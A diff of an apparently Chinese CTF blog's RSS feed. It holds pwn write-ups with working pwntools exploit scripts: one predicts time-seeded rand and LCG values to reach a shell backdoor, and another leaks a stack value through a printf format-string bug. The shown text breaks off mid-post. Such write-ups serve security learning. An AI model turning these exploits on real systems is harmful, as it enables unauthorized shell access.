@@ -1,236 +1,241 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>printf的小巧思</title><link>https://dxfaker.top/posts/printf/</link><guid isPermaLink="true">https://dxfaker.top/posts/printf/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
-&lt;p&gt;这个是25新生赛的题，一开始我以为UAF，但是后面发现他只用了堆，然后就以为可以通过格式化字符串漏洞来打，再到后面发现我又错了，看来还得练啊&lt;/p&gt;
-&lt;h1&gt;正文&lt;/h1&gt;
-&lt;pre&gt;&lt;code&gt;int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe4/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe4/</guid><description>我好困，好困。。。。。</description><pubDate>Fri, 11 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;等一下就要回家了，所以今天大概率就更一篇吧，还有这个食蜂好好看&lt;/p&gt;
+&lt;h1&gt;兰斯先生的秘密&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有canary+PIE,要泄露这俩&lt;/p&gt;
+&lt;p&gt;看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  __int64 v3; // [rsp+0h] [rbp-20h] BYREF
-  __int64 buf; // [rsp+8h] [rbp-18h] BYREF
-  char *format; // [rsp+10h] [rbp-10h]
-  int fd; // [rsp+1Ch] [rbp-4h]
+  unsigned int v3; // eax
+  unsigned int v5; // [rsp+Ch] [rbp-4h]
 
   init(argc, argv, envp);
-  buf = 0;
-  v3 = 0;
-  fd = open(&quot;/dev/urandom&quot;, 0);
-  if ( fd &amp;lt; 0 )
-  {
-    perror(&quot;Failed to open /dev/urandom&quot;);
-    exit(-1);
-  }
-  read(fd, &amp;amp;buf, 8u);
-  close(fd);
-  format = (char *)malloc(0x100u);
-  printf(&quot;User name: &quot;);
-  __isoc99_scanf(&quot;%255s&quot;, format);
-  puts(&quot;Hello, &quot;);
-  printf(format);
-  printf(&quot;\nPassword: &quot;);
-  __isoc99_scanf(&quot;%lld&quot;, &amp;amp;v3);
-  if ( v3 == buf )
-  {
-    puts(&quot;Login successful!&quot;);
-    system(&quot;/bin/sh&quot;);
-  }
-  else
-  {
-    puts(&quot;Login failed!&quot;);
-  }
-  free(format);
-  exit(0);
+  puts(&quot;Do you want to know srand&apos;s secret?&quot;);
+  puts(&quot;You have to enter 3 gates which tests your abilities!&quot;);
+  puts(&quot;But the key is *predict*. I guess no one can solve them. Hiahia!&quot;);
+  v3 = gate1();
+  v5 = gate2(v3);
+  gate3(v5);
+  puts(&quot;All gates passed!&quot;);
+  b4ckdo0r();
+  return 0;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;先看main函数逻辑&lt;/p&gt;
-&lt;p&gt;省流:开了一个文件读了一串字节，然后进行对比，相同就可以直接get shell&lt;/p&gt;
-&lt;p&gt;可是现在的问题是我哪知道他读的是哪里的文件，然后是有一个输入format存储到堆上的操作&lt;/p&gt;
-&lt;p&gt;然后checksec&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
+&lt;p&gt;很直白啊，过了三关就给后门&lt;/p&gt;
+&lt;p&gt;第一关&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 gate1()
+{
+  int v1; // [rsp+Ch] [rbp-14h] BYREF
+  unsigned int seed; // [rsp+10h] [rbp-10h]
+  int v3; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 1: Predict TIME&quot;);
+  puts(&quot;==============================&quot;);
+  seed = time(0);
+  srand(seed);
+  v3 = rand();
+  printf(&quot;Password:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v1);
+  if ( v3 != v1 )
+  {
+    puts(&quot;You can&apos;t predict the time easily!&quot;);
+    exit(0);
+  }
+  puts(&quot;You&apos;ve beaten the time and become a stronger self!&quot;);
+  return seed;
+}
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;只开了NX&lt;/p&gt;
-&lt;p&gt;那就看向唯一能操作的地方&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; format = (char *)malloc(0x100u);
-  printf(&quot;User name: &quot;);
-  __isoc99_scanf(&quot;%255s&quot;, format);
-  puts(&quot;Hello, &quot;);
-  printf(format);
+&lt;p&gt;时间管理大师，造一个伪随机应该可以结束战斗&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall gate2(unsigned int a1)
+{
+  int v2; // [rsp+1Ch] [rbp-14h] BYREF
+  unsigned int v3; // [rsp+20h] [rbp-10h]
+  int i; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 2: Predict calculation&quot;);
+  puts(&quot;==============================&quot;);
+  v3 = a1;
+  for ( i = 0; i &amp;lt;= 114513; ++i )
+    v3 = lcg(v3);
+  printf(&quot;Password:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v2);
+  if ( v3 != v2 )
+  {
+    puts(&quot;Well, it seems you don&apos;t know... Maybe you can learn about LCG?&quot;);
+    exit(0);
+  }
+  puts(&quot;Good job! That&apos;s one of the ways how random number works.&quot;);
+  return v3;
+}
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;复习一下printf操作&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;格式符&lt;/th&gt;
-&lt;th&gt;含义&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%d&lt;/code&gt; / &lt;code&gt;%i&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;有符号十进制整数&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%u&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;无符号十进制整数&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%x&lt;/code&gt; / &lt;code&gt;%X&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;十六进制整数&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%p&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;指针地址（十六进制）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%s&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;字符串（从参数指向的地址读取）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%c&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%n&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;&lt;strong&gt;将已打印字符数写入参数指向的地址&lt;/strong&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%hhn&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;写 1 字节&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%hn&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;写 2 字节&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;%lln&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;写 8 字节&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;以及经典的格式化字符串漏洞&lt;/p&gt;
-&lt;p&gt;format可以输入%p%s%n,以达到信息泄露以及任意内存写的操作&lt;/p&gt;
-&lt;p&gt;而且你看栈布局&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;__int64 v3;    // [rsp+0h]  [rbp-20h]
-__int64 buf;   // [rsp+8h]  [rbp-18h]
-char *format;  // [rsp+10h] [rbp-10h]
+&lt;p&gt;第一轮的seed传递到第二轮，进行114514次lcg&lt;/p&gt;
+&lt;p&gt;然后输入比较，最后把处理后的值传递出来&lt;/p&gt;
+&lt;p&gt;第三轮则是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 __fastcall gate3(unsigned int a1)
+{
+  int v2; // [rsp+18h] [rbp-18h] BYREF
+  int v3; // [rsp+1Ch] [rbp-14h]
+  int v4; // [rsp+20h] [rbp-10h]
+  unsigned int v5; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
 
+  v6 = __readfsqword(0x28u);
+  puts(&quot;==============================&quot;);
+  puts(&quot;Gate 3: Predict unknown&quot;);
+  puts(&quot;==============================&quot;);
+  srand(a1);
+  v3 = rand();
+  v4 = rand();
+  v5 = rand();
+  printf(&quot;First random number:%u\n&quot;, v3);
+  printf(&quot;Second random number:%u\n&quot;, v4);
+  printf(&quot;Your answer:&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;amp;v2);
+  if ( v5 != v2 )
+  {
+    puts(&quot;Haha...It&apos;s random, how can you predict it?&quot;);
+    exit(0);
+  }
+  puts(&quot;Wow, random number is in fact not random,right?&quot;);
+  return v5;
+}
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;format紧接着要对比的buf以及v3&lt;/p&gt;
-&lt;p&gt;再回顾printf的操作中可以读任意地址的%7$llx,那我是不是可以尝试一下把buf的数据读出来，那不就可以在下一次输入的时候使其相同，那不就结束战斗了&lt;/p&gt;
-&lt;p&gt;不开tmux&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; break *0x4012da
-Breakpoint 1 at 0x4012da
-pwndbg&amp;gt; run &amp;lt; in.txt
-Starting program: /mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2 &amp;lt; in.txt
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
-User name: Hello,
-
-Breakpoint 1, 0x00000000004012da in main ()
-
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
- RAX  0
- RBX  0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
- RCX  0x7ffff7d1c6a4 (write+20) ◂— cmp rax, -0x1000 /* &apos;H=&apos; */
- RDX  0
- RDI  0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
- RSI  0x7ffff7e04643 (_IO_2_1_stdout_+131) ◂— 0xe05710000000000a /* &apos;\n&apos; */
- R8   7
- R9   0xff
- R10  0x7ffff7c0abe8 ◂— 0x11002200006cb5
- R11  0x202
- R12  1
- R13  0
- R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
- R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
- RBP  0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
- RSP  0x7fffffffd8b0 ◂— 0
- RIP  0x4012da (main+213) ◂— call printf@plt
-──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
-b► 0x4012da &amp;lt;main+213&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
-
-   0x4012df &amp;lt;main+218&amp;gt;    lea    rax, [rip + 0xd61]     RAX =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
-   0x4012e6 &amp;lt;main+225&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
-   0x4012e9 &amp;lt;main+228&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
-   0x4012ee &amp;lt;main+233&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
-
-   0x4012f3 &amp;lt;main+238&amp;gt;    lea    rax, [rbp - 0x20]
-   0x4012f7 &amp;lt;main+242&amp;gt;    mov    rsi, rax
-   0x4012fa &amp;lt;main+245&amp;gt;    lea    rax, [rip + 0xd52]     RAX =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
-   0x401301 &amp;lt;main+252&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
-   0x401304 &amp;lt;main+255&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
-   0x401309 &amp;lt;main+260&amp;gt;    call   __isoc99_scanf@plt          &amp;lt;__isoc99_scanf@plt&amp;gt;
-───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
-00:0000│ rsp 0x7fffffffd8b0 ◂— 0
-01:0008│-018 0x7fffffffd8b8 ◂— 0x710900f23a7475a1
-02:0010│-010 0x7fffffffd8c0 —▸ 0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
-03:0018│-008 0x7fffffffd8c8 ◂— 0x3ffffd9f8
-04:0020│ rbp 0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
-05:0028│+008 0x7fffffffd8d8 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
-06:0030│+010 0x7fffffffd8e0 —▸ 0x7fffffffd920 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
-07:0038│+018 0x7fffffffd8e8 —▸ 0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
-─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
- ► 0 0x4012da       main+213
-   1 0x7ffff7c2a1ca __libc_start_call_main+122
-   2 0x7ffff7c2a28b __libc_start_main+139
-   3 0x401111       _start+33
-pwndbg&amp;gt;
-
-
+&lt;p&gt;已处理后的值作为基准及逆行三次随机，然后比较产生的最后一个随机数成功就能结束战斗了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int b4ckdo0r()
+{
+  puts(&quot;Genius!&quot;);
+  puts(&quot;You defeated all random gates! Here is your bonus:&quot;);
+  return system(&quot;/bin/sh&quot;);
+}
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;可以看到rbp-0x8、rbp-0x10、rbp-0x18&lt;/p&gt;
-&lt;p&gt;fmtdump / fmtarg：栈上的第 N 格&quot;直接翻译成&quot;printf 的第 %N$ 个参数&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; fmtdump 8
-%-6$  0x0000000000000000 #v3
-%-7$  0x710900f23a7475a1 #buf
-%-8$  0x00000000004052a0 #format
-%-9$  0x00000003ffffd9f8
-%-10$  0x00007fffffffd970
-%-11$  0x00007ffff7c2a1ca
-%-12$  0x00007fffffffd920
-%-13$  0x00007fffffffd9f8
+&lt;p&gt;很朴实的后门&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;扣了半小时手机我决定继续战斗&lt;/s&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;程序启动时的 &lt;code&gt;time(0)&lt;/code&gt; 通常与攻击者当前时间非常接近（网络延迟一般 0~3 秒）。因此可以枚举当前时间前后几秒作为候选种子：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;current = int(time.time())
+for delta in range(-5, 6):   # 尝试 ±5 秒
+   seed = current + delta
+   # 用这个种子生成随机数
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;x86-64 下第 1~5 个变参走 rsi/rdx/rcx/r8/r9,第 6 个起走栈, 也就是调用者 rsp+0 / rsp+8 / ...:&lt;/p&gt;
-&lt;p&gt;所以就可以动手写exp了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;那怎么自己造一个随机数呢&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;ctypes 调用 libc 的 srand/rand&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;libc直接用我自己的得了&lt;/p&gt;
+&lt;p&gt;然后是lcg的问题&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def lcg(a1):
+    return (1103515245 * a1 + 12345) &amp;amp; 0x7FFFFFFF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;标准的我直接照抄就好了&lt;/p&gt;
+&lt;p&gt;ok，现在陈述一下大致的攻击思路&lt;/p&gt;
+&lt;p&gt;第一阶段直接用time(0)直接生成的rand作为校验，第二轮把第一轮生成的数字进行114514次lcg，第三轮再生成三个随机数，取第三个校验即可&lt;/p&gt;
+&lt;p&gt;抖动机制讲解&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;程序用 &lt;code&gt;seed = time(0); srand(seed);&lt;/code&gt; 生成随机数。
+&lt;code&gt;time(0)&lt;/code&gt; 返回的是&lt;strong&gt;秒级时间戳&lt;/strong&gt;。你在本地脚本中获取的 &lt;code&gt;current = int(time.time())&lt;/code&gt; 和远程程序实际执行 &lt;code&gt;time(0)&lt;/code&gt; 的时刻，可能不在同一秒内，原因包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;网络延迟&lt;/strong&gt;：你发送连接、数据到达服务器、服务器启动程序都需要时间。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器处理时间&lt;/strong&gt;：程序初始化、等待输入等消耗时间。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时钟偏差&lt;/strong&gt;：本地与服务器系统时钟可能有微小差异。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时区无关&lt;/strong&gt;：&lt;code&gt;time(0)&lt;/code&gt; 返回 UTC 时间戳，但本地时钟若不准也会影响。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此，远程程序实际使用的种子可能是 &lt;code&gt;current - 2&lt;/code&gt;、&lt;code&gt;current - 1&lt;/code&gt;、&lt;code&gt;current&lt;/code&gt;、&lt;code&gt;current + 1&lt;/code&gt;、&lt;code&gt;current + 2&lt;/code&gt; 中的某一个。枚举 &lt;code&gt;range(-2, 3)&lt;/code&gt; 就是覆盖这 5 个可能的种子。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;for delta in range(-2, 3):
+    seed = current + delta          # 猜测种子
+    ans1 = predict_gate1(seed)      # 用该种子预测 Gate1 需要的随机数
+    p.recvuntil(b&apos;Password:&apos;)       # 等待提示
+    p.sendline(str(ans1).encode())  # 发送预测值
+    resp = p.recvline()             # 读取响应
+    if b&apos;beaten&apos; in resp or b&apos;stronger&apos; in resp:
+        seed1 = seed                # 通过，记录正确的种子
+        break
+    p.close()                       # 失败，关闭连接
+    p = start(host, port)           # 重新连接（因为程序失败会退出）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;exp(0x7FFFFFFFF防坠机)&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;from pwn import *
+import ctypes
+import time
 
-context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;info&apos;)
+try:
+    libc = ctypes.CDLL(&apos;./libc.so.6&apos;)
+except OSError:
+    libc = ctypes.CDLL(None)
 
-LOCAL = True      
-HOST, PORT = &apos;node.szu.moe&apos;, 10053
+def lcg(a1):
+    return (1103515245 * a1 + 12345) &amp;amp; 0x7FFFFFFF
 
-elf = ELF(&apos;./guess2&apos;)
+def predict_gate1(seed):
+    libc.srand(seed)
+    return libc.rand() &amp;amp; 0x7fffffff
 
+def predict_gate2(seed):
+    v = seed
+    for _ in range(114514):
+        v = lcg(v)
+    return v
 
-def u64s(x):
-    return x - (1 &amp;lt;&amp;lt; 64) if x &amp;gt;= (1 &amp;lt;&amp;lt; 63) else x
+def predict_gate3(seed):
+    libc.srand(seed)
+    libc.rand()
+    libc.rand()
+    return libc.rand() &amp;amp; 0x7fffffff
 
+def start(host, port):
+    return remote(host, port) if args.REMOTE else process(&apos;./pwn&apos;)
 
-def main():
-    io = process(elf.path) if LOCAL else remote(HOST, PORT)
+def solve(host, port):
+    p = start(host, port)
+    current = int(time.time())
+    seed1 = None
 
-    io.sendlineafter(b&apos;User name: &apos;, b&apos;%7$llx&apos;)
-    io.recvuntil(b&apos;Hello, \n&apos;)
-    buf = u64s(int(io.recvuntil(b&apos;\n&apos;, drop=True).strip(), 16))
+    for delta in range(-2, 3):
+        seed = current + delta
+        ans1 = predict_gate1(seed)
+        p.recvuntil(b&apos;Password:&apos;)
+        p.sendline(str(ans1).encode())
+        resp = p.recvline()
+        if b&apos;beaten&apos; in resp or b&apos;stronger&apos; in resp:
+            seed1 = seed
+            break
+        p.close()
+        p = start(host, port)
 
-    io.sendlineafter(b&apos;Password: &apos;, str(buf).encode())
+    if seed1 is None:
+        return
 
-    io.interactive()
+    ans2 = predict_gate2(seed1)
+    p.recvuntil(b&apos;Password:&apos;)
+    p.sendline(str(ans2).encode())
+    p.recvline()
 
+    ans3 = predict_gate3(ans2)
+    p.recvuntil(b&apos;Your answer:&apos;)
+    p.sendline(str(ans3).encode())
+    p.recvline()
+
+    p.interactive()
 
 if __name__ == &apos;__main__&apos;:
-    main()
+    solve(&apos;127.0.0.1&apos;, 57639)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;blockquote&gt;
-&lt;p&gt;把 64 位无符号整数转成有符号：&lt;/p&gt;
-&lt;p&gt;若最高位为 1（x &amp;gt;= 2^63），减去 2^64 变成负数
-否则原样返回
-为什么必须做：printf(&quot;%llx&quot;) 把随机数按无符号打印（如 14346747841414464070），而 scanf(&quot;%lld&quot;) 是有符号解析，最大只接受 9223372036854775807。直接发会解析溢出 → v3 != buf → 登录失败。&lt;/p&gt;
-&lt;p&gt;随机数最高位为 1 的概率是 50%，所以这函数直接决定成功率是 50% 还是 100%。&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;p&gt;搞了一中午机械臂，下午信号与系统一点都听不进去，幸好提前听了第一节课&lt;/p&gt;
+&lt;p&gt;PS:信号与系统上写WP真苏轼啊&lt;/p&gt;
 </content:encoded></item><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe3/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe3/</guid><description>可能这是真的第一次写pwn很舒服吧</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;题外话&lt;/h1&gt;
 &lt;p&gt;现在我做封面的技术真的是炉火纯青了&lt;/p&gt;
 &lt;p&gt;听v我写的进度很慢，听方大同写的速度就很快&lt;/p&gt;
@@ -536,6 +541,239 @@ p.interactive()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;你别说，加log还能看是哪出问题的&lt;/p&gt;
 &lt;p&gt;晚安，周末有事，估计暂时更新不了了&lt;/p&gt;
+</content:encoded></item><item><title>printf的小巧思</title><link>https://dxfaker.top/posts/printf/</link><guid isPermaLink="true">https://dxfaker.top/posts/printf/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;这个是25新生赛的题，一开始我以为UAF，但是后面发现他只用了堆，然后就以为可以通过格式化字符串漏洞来打，再到后面发现我又错了，看来还得练啊&lt;/p&gt;
+&lt;h1&gt;正文&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // [rsp+0h] [rbp-20h] BYREF
+  __int64 buf; // [rsp+8h] [rbp-18h] BYREF
+  char *format; // [rsp+10h] [rbp-10h]
+  int fd; // [rsp+1Ch] [rbp-4h]
+
+  init(argc, argv, envp);
+  buf = 0;
+  v3 = 0;
+  fd = open(&quot;/dev/urandom&quot;, 0);
+  if ( fd &amp;lt; 0 )
+  {
+    perror(&quot;Failed to open /dev/urandom&quot;);
+    exit(-1);
+  }
+  read(fd, &amp;amp;buf, 8u);
+  close(fd);
+  format = (char *)malloc(0x100u);
+  printf(&quot;User name: &quot;);
+  __isoc99_scanf(&quot;%255s&quot;, format);
+  puts(&quot;Hello, &quot;);
+  printf(format);
+  printf(&quot;\nPassword: &quot;);
+  __isoc99_scanf(&quot;%lld&quot;, &amp;amp;v3);
+  if ( v3 == buf )
+  {
+    puts(&quot;Login successful!&quot;);
+    system(&quot;/bin/sh&quot;);
+  }
+  else
+  {
+    puts(&quot;Login failed!&quot;);
+  }
+  free(format);
+  exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先看main函数逻辑&lt;/p&gt;
+&lt;p&gt;省流:开了一个文件读了一串字节，然后进行对比，相同就可以直接get shell&lt;/p&gt;
+&lt;p&gt;可是现在的问题是我哪知道他读的是哪里的文件，然后是有一个输入format存储到堆上的操作&lt;/p&gt;
+&lt;p&gt;然后checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只开了NX&lt;/p&gt;
+&lt;p&gt;那就看向唯一能操作的地方&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; format = (char *)malloc(0x100u);
+  printf(&quot;User name: &quot;);
+  __isoc99_scanf(&quot;%255s&quot;, format);
+  puts(&quot;Hello, &quot;);
+  printf(format);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;复习一下printf操作&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;格式符&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%d&lt;/code&gt; / &lt;code&gt;%i&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;有符号十进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%u&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无符号十进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%x&lt;/code&gt; / &lt;code&gt;%X&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;十六进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%p&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指针地址（十六进制）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%s&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;字符串（从参数指向的地址读取）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%c&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%n&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;将已打印字符数写入参数指向的地址&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%hhn&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 1 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%hn&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 2 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%lln&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 8 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;以及经典的格式化字符串漏洞&lt;/p&gt;
+&lt;p&gt;format可以输入%p%s%n,以达到信息泄露以及任意内存写的操作&lt;/p&gt;
+&lt;p&gt;而且你看栈布局&lt;/p&gt;
